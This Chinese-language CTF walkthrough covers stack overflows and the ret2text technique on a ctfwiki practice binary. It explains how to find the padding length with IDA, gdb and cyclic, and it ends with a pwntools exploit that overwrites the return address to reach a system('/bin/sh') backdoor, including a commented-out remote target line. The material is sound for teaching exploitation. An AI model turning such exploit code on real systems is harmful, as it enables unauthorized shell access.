<a name="4985b9c9"></a>
## 什么是栈溢出：

 栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变（比如gets函数，他不会去验证你输入的值的长度，通过这个函数，你可以往一个本身大小为4字节的数组中填入任意大小的数据，如果填入8字节的数据，将会导致栈溢出，进而程序报错）。就像是往杯子里倒水，水满了溢出来最后烫到你一样。<br />**最简单的栈溢出利用：ret2text**<br />通过栈溢出修改call指令保存在栈上的返回地址（eip的值），这样cpu执行ret指令的时候，就会将被修改的值从栈上取出放入eip寄存器中，紧接着执行eip所指向的位置的指令，这样就相当于控制了程序的执行流。

<a name="1c7c1fdd"></a>
## 例题：ctfwiki ret2text

<a name="e0958639"></a>
### 首先，cheaksec。

![](https://img-blog.csdnimg.cn/20210221152436742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&crop=0&crop=1&crop=1&id=Jqffs&originHeight=207&originWidth=939&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

32位小端序程序。<br />开启了堆栈不可执行保护（NX），即不会把堆栈上的数据当成指令来执行。<br />没有canary保护，可以利用栈溢出来修改eip。<br />PIE地址随机化没有开启。

<a name="394701f8"></a>
### ida分析

如果源码比较复杂，可以通过运行程序的方式来辅助理解程序。<br />main函数存在gets函数，即存在栈溢出漏洞。<br />![](https://img-blog.csdnimg.cn/20210221152459919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&crop=0&crop=1&crop=1&id=i9CBu&originHeight=243&originWidth=671&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

存在一个secure函数，函数内部调用了system（“/bin/sh”），即后门函数，程序中调用了该函数后可以获得一个shell。<br />![](https://img-blog.csdnimg.cn/2021022115252619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&crop=0&crop=1&crop=1&id=bl7Fd&originHeight=301&originWidth=531&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

在ida视图下，可以看到system函数地址为0x0804863A<br />![](https://img-blog.csdnimg.cn/20210221152547541.png#pic_center#crop=0&crop=0&crop=1&crop=1&id=P6OOl&originHeight=84&originWidth=872&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**思路：首先通过栈溢出填充垃圾数据，覆盖到eip之前，再填入system函数地址，即可获得shell。**

<a name="338d3986"></a>
### 如何确定栈溢出所需要的垃圾数据长度？

<a name="695c4042"></a>
#### 方式一：通过ida可以观察出来，但有时结果不太准确。

![](https://img-blog.csdnimg.cn/20210221152612188.png#pic_center#crop=0&crop=0&crop=1&crop=1&id=Aif7O&originHeight=62&originWidth=514&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

上图显示0x64的大小即可覆盖到ebp，但却与动态调试的结果不同。（有时候动态调试结果也不太准确，一般以动态调试结果为准，也可以动态调试结果和ida结果分别尝试一次）

<a name="dadfa31f"></a>
#### 方式二：动态调试

在call函数处下断点，输入aaaa，<br />![](https://img-blog.csdnimg.cn/20210221152633913.png#pic_center#crop=0&crop=0&crop=1&crop=1&id=TJAWb&originHeight=97&originWidth=509&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://img-blog.csdnimg.cn/20210221152656633.png#pic_center#crop=0&crop=0&crop=1&crop=1&id=fUE7i&originHeight=122&originWidth=623&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

aaaa所在的地址为0xffffd24c，ebp为 0xffffd2b8，相减得0x6c，即覆盖0x6c个垃圾数据“a”即可到达ebp的位置。<br />![](https://img-blog.csdnimg.cn/20210221152728416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&crop=0&crop=1&crop=1&id=PNjWP&originHeight=439&originWidth=484&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

此时再覆盖4字节的垃圾数据“b”（32位程序为4字节，64位程序为8字节）：<br />![](https://img-blog.csdnimg.cn/20210221152751179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&crop=0&crop=1&crop=1&id=lYbtr&originHeight=421&originWidth=500&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

此时如果再往里输入数据，就可以修改eip的值，我们此时输入system函数的地址，即可完成利用。<br />在上述过程中，我们向程序输入了（0x6c+4）的垃圾数据。

<a name="dab1d734"></a>
##### 手算比较麻烦，还有一种小工具cyclic

首先输入cyclic 200：<br />![](https://img-blog.csdnimg.cn/20210221152834173.png#pic_center#crop=0&crop=0&crop=1&crop=1&id=GW55J&originHeight=113&originWidth=1335&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

得到一组数据，将其复制下来，然后用gdb调试程序，输入r运行，运行之后将这段程序输入进去：<br />![](https://img-blog.csdnimg.cn/20210221152901923.png#pic_center#crop=0&crop=0&crop=1&crop=1&id=s14eV&originHeight=166&originWidth=1336&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

之后程序报错：<br />![](https://img-blog.csdnimg.cn/20210221152924308.png#pic_center#crop=0&crop=0&crop=1&crop=1&id=couL6&originHeight=114&originWidth=722&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

这说明我们输入的字符覆盖了eip，即字符“daab”，输入cyclic -l daab就能知道输入点到eip的距离，即【0x6c+4】的值：<br />![](https://img-blog.csdnimg.cn/20210221152949108.png#pic_center#crop=0&crop=0&crop=1&crop=1&id=GAGuW&originHeight=95&originWidth=319&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

exp：

```python
from pwn import *  //引入pwntools模块
sh = process('./ret2text')//包含本地程序
#sh = remote('6.6.6.6',888)//包含6.6.6.6服务器的888端口的程序
target = 0x804863a//返回地址
sh.sendline('A' * (0x6c + 4) + p32(target))
//p32()表示将数据转换为32位系统下在内存中的存在方式
sh.interactive()//接收交互结果
```
